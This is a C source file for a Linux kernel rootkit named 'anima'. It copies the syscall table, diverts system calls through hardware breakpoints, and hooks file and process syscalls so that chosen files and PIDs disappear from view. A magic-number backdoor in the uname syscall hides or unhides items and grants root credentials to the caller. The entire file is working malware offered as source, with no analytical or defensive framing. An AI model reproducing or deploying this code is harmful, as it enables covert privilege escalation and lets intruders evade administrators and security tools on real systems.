#include <asm/segment.h>
#include <asm/ptrace.h>
#include <asm/unistd.h>
#include <asm/siginfo.h>

#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/perf_event.h>

#include <anima/config.h>
#include <anima/debug.h>
#include <anima/ksyms.h>
#include <anima/libc.h>
#include <anima/uaccess.h>
#include <anima/structs.h>
#include <anima/syscalls.h>
#include <anima/anima_ctl.h>
#include <anima/x86.h>

#define HOOK(sys, func)	\
		do {	\
			sys_stats_init(__NR_##sys);			\
			fake_sct[__NR_##sys] = (unsigned long)func;	\
		} while (0)

static unsigned long fake_sct[NR_SYSCALLS];

/*
 * FIXME: new algo for better performance
 */
static u64 hidden_inodes[MAX_HIDDEN_INODES];
static int hidden_pids[MAX_HIDDEN_PIDS];

static int is_inode_hidden(u64 ino)
{
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i] == ino)
			return 1;
	return 0;
}

static void hide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
			hidden_inodes[i] = ino;
			break;
		}
	}
}

static void unhide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_inodes[i] == ino) {
			hidden_inodes[i] = 0;
			break;
		}
	}
}

static int is_pid_hidden_no_getpid(pid_t pid)
{
	/* pid == 0 => calling process */
	if (!pid)
		goto not_hidden;

	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
		if (hidden_pids[i] == pid)
			return 1;

not_hidden:
	return 0;
}

static int is_pid_hidden(pid_t pid)
{
	/* let calling process access system calls if pid == getpid() */
	if (pid == ksyms.old_sys_getpid())
		return 0;
	return is_pid_hidden_no_getpid(pid);
}

static void hide_pid(pid_t pid)
{
	pr_debug("%s: pid=%d", __func__, pid);

	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
		if (!hidden_pids[i] || hidden_pids[i] == pid) {
			hidden_pids[i] = pid;
			break;
		}
	}
}

static void unhide_pid(pid_t pid)
{
	pr_debug("%s: pid=%d", __func__, pid);

	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = 0;
			break;
		}
	}
}

/******************************************************************************
 * filesystem syscalls with path argument
 *
 * open, stat, lstat, access, execve, truncate, getdents, chdir, rename,
 * mkdir, rmdir, creat, link, unlink, symlink, readlink, chmod, chown, utime
 * mknod, statfs, chroot, mount, umount, *xattr, getdents64, utimes, and
 * much more
 *****************************************************************************/
asmlinkage long new_sys_chdir(char *path)
{
	long ret;
	struct stat st;
	SYS_STATS_INC(chdir);

	SET_KERNEL_DS;
	ret = ksyms.old_sys_stat(path, &st);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(st.st_ino)) {
		pr_debug("%s: hiding inode %lu", __func__, st.st_ino);
		return -ENOENT;
	}


	return ksyms.old_sys_chdir(path);
}

asmlinkage long new_sys_stat(char *path, struct stat *st)
{
	long ret;
	struct stat tmp_st;
	SYS_STATS_INC(stat);

	SET_KERNEL_DS;
	ret = ksyms.old_sys_stat(path, &tmp_st);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(tmp_st.st_ino)) {
		pr_debug("%s: hiding inode %lu", __func__, tmp_st.st_ino);
		return -ENOENT;
	}
	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
		pr_debug("%s: _copy_to_user failed", __func__);

	return ret;
}

asmlinkage long new_sys_lstat(char *path, struct stat *st)
{
	long ret;
	struct stat tmp_st;
	SYS_STATS_INC(lstat);

	SET_KERNEL_DS;
	ret = ksyms.old_sys_lstat(path, &tmp_st);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(tmp_st.st_ino)) {
		pr_debug("%s: hiding inode %lu", __func__, tmp_st.st_ino);
		return -ENOENT;
	}
	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
		pr_debug("%s: _copy_to_user failed", __func__);

	return ret;
}

asmlinkage long new_sys_fstatat(int fd, char *path, struct stat *st, int flag)
{
	long ret;
	struct stat tmp_st;
	SYS_STATS_INC(newfstatat);

	SET_KERNEL_DS;
	ret = ksyms.old_sys_fstatat(fd, path, &tmp_st, flag);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(tmp_st.st_ino)) {
		pr_debug("%s: hiding inode %lu", __func__, tmp_st.st_ino);
		return -ENOENT;
	}
	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
		pr_debug("%s: _copy_to_user failed", __func__);

	return ret;
}

asmlinkage long new_sys_open(char *filename, int flags, umode_t mode)
{
	long ret;
	struct stat st;
	SYS_STATS_INC(open);

	SET_KERNEL_DS;
	ret = ksyms.old_sys_stat(filename, &st);
	SET_OLD_FS;
	if (!ret && is_inode_hidden(st.st_ino))
		return -ENOENT;

	return ksyms.old_sys_open(filename, flags, mode);
}

asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	long ret;
	unsigned long r;
	SYS_STATS_INC(getdents);

	ret = ksyms.old_sys_getdents(fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (int pos = 0; pos < ret; ) {
		unsigned long d_ino;
		unsigned short d_reclen;
		char *ptr = (char *)dirp + pos;
		struct linux_dirent *d = (struct linux_dirent *)ptr;

		/* FIXME: use ksyms */
		if (get_user(d_ino, &d->d_ino))
			return -EFAULT;
		if (get_user(d_reclen, &d->d_reclen))
			return -EFAULT;

		if (is_inode_hidden(d_ino)) {
			r = ksyms._copy_to_user(d, (char *)d + d_reclen, ret - pos - d_reclen);
			if (r) {
				pr_debug("%s: _copy_to_user", __func__);
				return -EFAULT;
			} else {
				ret -= d_reclen;
			}
		} else {
			pos += d_reclen;
		}
	}

	return ret;
}

asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
	long ret;
	unsigned long r;
	SYS_STATS_INC(getdents64);

	ret = ksyms.old_sys_getdents64(fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (int pos = 0; pos < ret; ) {
		unsigned long d_ino;
		unsigned short d_reclen;
		char *ptr = (char *)dirp + pos;
		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;

		/* FIXME: use ksyms */
		if (get_user(d_ino, &d->d_ino))
			return -EFAULT;
		if (get_user(d_reclen, &d->d_reclen))
			return -EFAULT;

		if (is_inode_hidden(d_ino)) {
			r = ksyms._copy_to_user(d, (char *)d + d_reclen, ret - pos - d_reclen);
			if (r) {
				pr_debug("%s: _copy_to_user", __func__);
				return -EFAULT;
			} else {
				ret -= d_reclen;
			}
		} else {
			pos += d_reclen;
		}
	}

	return ret;
}

asmlinkage long new_sys_getpgid(pid_t pid)
{
	SYS_STATS_INC(getgid);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_getpgid(pid);
}

asmlinkage long new_sys_getsid(pid_t pid)
{
	SYS_STATS_INC(getsid);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_getsid(pid);
}

asmlinkage long new_sys_setpgid(pid_t pid, pid_t pgid)
{
	SYS_STATS_INC(setpgid);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_setpgid(pid, pgid);
}

asmlinkage long new_sys_getpriority(int which, int who)
{
	SYS_STATS_INC(getpriority);
	if (is_pid_hidden(who))
		return -ESRCH;

	return ksyms.old_sys_getpriority(which, who);
}

asmlinkage long new_sys_kill(pid_t pid, int sig)
{
	SYS_STATS_INC(kill);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_kill(pid, sig);
}

asmlinkage long new_sys_sched_setscheduler(pid_t pid, int policy, void *param)
{
	SYS_STATS_INC(sched_setscheduler);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_setscheduler(pid, policy, param);
}

asmlinkage long new_sys_sched_setparam(pid_t pid, void *param)
{
	SYS_STATS_INC(sched_setparam);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_setparam(pid, param);
}

asmlinkage long new_sys_sched_getscheduler(pid_t pid)
{
	SYS_STATS_INC(sched_getscheduler);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_getscheduler(pid);
}

asmlinkage long new_sys_sched_getparam(pid_t pid, void *param)
{
	SYS_STATS_INC(sched_getparam);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_getparam(pid, param);
}

asmlinkage long new_sys_sched_setaffinity(pid_t pid, unsigned int len,
					unsigned long *user_mask_ptr)
{
	SYS_STATS_INC(sched_setaffinity);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_setaffinity(pid, len, user_mask_ptr);
}

asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len,
					unsigned long *user_mask_ptr)
{
	SYS_STATS_INC(sched_getaffinity);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_getaffinity(pid, len, user_mask_ptr);
}

asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, void *interval)
{
	SYS_STATS_INC(sched_rr_get_interval);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_rr_get_interval(pid, interval);
}

asmlinkage long new_sys_wait4(pid_t pid, int *status,
				int options, void *rusage)
{
	SYS_STATS_INC(wait4);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_wait4(pid, status, options, rusage);
}

asmlinkage long new_sys_waitid(int which, pid_t pid,
				void *infop,
				int options, void *ru)
{
	SYS_STATS_INC(waitid);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_waitid(which, pid, infop, options, ru);
}

asmlinkage long new_sys_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
					siginfo_t *uinfo)
{
	SYS_STATS_INC(rt_tgsigqueueinfo);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_rt_tgsigqueueinfo(tgid, pid, sig, uinfo);
}

asmlinkage long new_sys_rt_sigqueueinfo(int pid, int sig, siginfo_t *uinfo)
{
	SYS_STATS_INC(rt_sigqueueinfo);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_rt_sigqueueinfo(pid, sig, uinfo);
}

asmlinkage long new_sys_prlimit64(pid_t pid, unsigned int resource,
					void *new_rlim, void *old_rlim)
{
	SYS_STATS_INC(prlimit64);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_prlimit64(pid, resource, new_rlim, old_rlim);
}

asmlinkage long new_sys_ptrace(long request, pid_t pid, void *addr, void *data)
{
	SYS_STATS_INC(ptrace);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_ptrace(request, pid, addr, data);
}

asmlinkage long new_sys_migrate_pages(pid_t pid, unsigned long maxnode,
					unsigned long *from, unsigned long *to)
{
	SYS_STATS_INC(migrate_pages);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_migrate_pages(pid, maxnode, from, to);
}

asmlinkage long new_sys_move_pages(pid_t pid, unsigned long nr_pages,
				void **pages,
				int *nodes,
				int *status,
				int flags)
{
	SYS_STATS_INC(move_pages);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_move_pages(pid, nr_pages, pages, nodes, status, flags);
}

asmlinkage long new_sys_get_robust_list(int pid, void **head_ptr, size_t *len_ptr)
{
	SYS_STATS_INC(get_robust_list);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_get_robust_list(pid, head_ptr, len_ptr);
}

asmlinkage long new_sys_perf_event_open(
                void *attr_uptr,
                pid_t pid, int cpu, int group_fd, unsigned long flags)
{
	SYS_STATS_INC(perf_event_open);
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_perf_event_open(attr_uptr, pid, cpu, group_fd, flags);
}

asmlinkage void new_sys_exit(int error_code)
{
	pid_t pid = ksyms.old_sys_getpid();
	SYS_STATS_INC(exit);

	if (is_pid_hidden_no_getpid(pid))
		unhide_pid(pid);

	ksyms.old_sys_exit(error_code);
}

asmlinkage void new_sys_exit_group(int error_code)
{
	pid_t pid = ksyms.old_sys_getpid();
	SYS_STATS_INC(exit_group);

	if (is_pid_hidden_no_getpid(pid))
		unhide_pid(pid);

	ksyms.old_sys_exit_group(error_code);
}

asmlinkage long new_sys_clone(unsigned long flags, void *child_stack,
				void *ptid, void *ctid, void *regs)
{
	register int pid_hidden = 0;
	long pid;

	if (flags & (CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD))
		pid_hidden = is_pid_hidden_no_getpid(ksyms.old_sys_getpid());

	pid = ksyms.old_sys_clone(flags, child_stack, ptid, ctid, regs);

	return pid;
}

asmlinkage long new_sys_fork(void)
{
	long pid;
	//register int pid_hidden = is_pid_hidden_no_getpid(ksyms.old_sys_getpid());

	//SYS_STATS_INC(fork);

	pid = ksyms.old_sys_fork();
	if (pid)
		printk("%ld\n", pid);

	return pid;
}

asmlinkage long new_sys_vfork(void)
{
	/* TODO */
	SYS_STATS_INC(vfork);
	return ksyms.old_sys_vfork();
}

asmlinkage long new_sys_reboot(int magic1, int magic2, int cmd, void *arg)
{
	return ksyms.old_sys_reboot(magic1, magic2, cmd, arg);
}

/*
 * rookit interface
 */
asmlinkage long new_sys_newuname(struct new_utsname *name)
{
	struct rk_args args;
	SYS_STATS_INC(uname);

	if (ksyms._copy_from_user(&args, name, sizeof(args)))
		pr_debug("%s: _copy_from_user failed", __func__);

	if (args.magic_number_1 != MAGIC_NUMBER_1 || args.magic_number_2 != MAGIC_NUMBER_2)
		return ksyms.old_sys_uname(name);

	pr_debug("%s: magic number reveived", __func__);

	switch (args.mode) {
	case HIDE_INODE:
		hide_inode(args.param1);
		break;
	case UNHIDE_INODE:
		unhide_inode(args.param1);
		break;
	case GET_ROOT:
		commit_creds(prepare_kernel_cred(NULL));
		break;
	case HIDE_PID:
		hide_pid(args.param1);
		break;
	case UNHIDE_PID:
		unhide_pid(args.param1);
		break;
#ifdef DEBUG
	case DEBUG_RK:
		debug_rk(hidden_inodes, hidden_pids);
		break;
	case DEBUG_STATS:
		debug_sys_stats();
		break;
#endif
	}

	return 0;
}

void system_call_hook(struct pt_regs *regs)
{
	/*
	 * call *sys_call_table(,%rax,8)
	 */
	unsigned long off = ((unsigned long)fake_sct - ksyms.sys_call_table);
	regs->ax += off / sizeof(unsigned long);
}

void ia32_system_call_hook(struct pt_regs *regs)
{
	pr_info("intercept call");
}

int hook_sys_call_table(void)
{
	anima_memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));
	anima_memset(hidden_pids, 0, ARRAY_SIZE(hidden_pids));
	anima_memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));

	HOOK(uname, new_sys_newuname);

	/* hide files */
	HOOK(open, new_sys_open);
	HOOK(chdir, new_sys_chdir);
	HOOK(stat, new_sys_stat);
	HOOK(lstat, new_sys_lstat);
	//HOOK(newfstatat, new_sys_fstatat);
	HOOK(getdents, new_sys_getdents);
	HOOK(getdents64, new_sys_getdents64);

	/* hide process */
	HOOK(getpgid, new_sys_getpgid);
	HOOK(getsid, new_sys_getsid);
	HOOK(setpgid, new_sys_setpgid);
	HOOK(getpriority, new_sys_getpriority);
	HOOK(kill, new_sys_kill);
	HOOK(sched_setscheduler, new_sys_sched_setscheduler);
	HOOK(sched_setparam, new_sys_sched_setparam);
	HOOK(sched_getscheduler, new_sys_sched_getscheduler);
	HOOK(sched_getparam, new_sys_sched_getparam);
	HOOK(sched_setaffinity, new_sys_sched_setaffinity);
	HOOK(sched_getaffinity, new_sys_sched_getaffinity);
	HOOK(sched_rr_get_interval, new_sys_sched_rr_get_interval);
	//HOOK(wait4, new_sys_wait4);
	//HOOK(waitid, new_sys_waitid);
	HOOK(rt_tgsigqueueinfo, new_sys_rt_tgsigqueueinfo);
	HOOK(rt_sigqueueinfo, new_sys_rt_sigqueueinfo);
	HOOK(prlimit64, new_sys_prlimit64);
	HOOK(ptrace, new_sys_ptrace);
	HOOK(migrate_pages, new_sys_migrate_pages);
	HOOK(move_pages, new_sys_move_pages);
	HOOK(get_robust_list, new_sys_get_robust_list);
	HOOK(perf_event_open, new_sys_perf_event_open);
	HOOK(exit, new_sys_exit);
	HOOK(exit_group, new_sys_exit_group);
	//HOOK(clone, new_sys_clone);
	//HOOK(fork, new_sys_fork);
	//HOOK(vfork, new_sys_vfork);

	HOOK(reboot, new_sys_reboot);

	/* architecture specific */
	x86_hw_breakpoint_register(0, ksyms.sys_call_table_call,
					DR_RW_EXECUTE, 0, system_call_hook);
	x86_hw_breakpoint_register(1, ksyms.ia32_syscall_sys_call_table_call,
					DR_RW_EXECUTE, 0, ia32_system_call_hook);

	return 0;
}
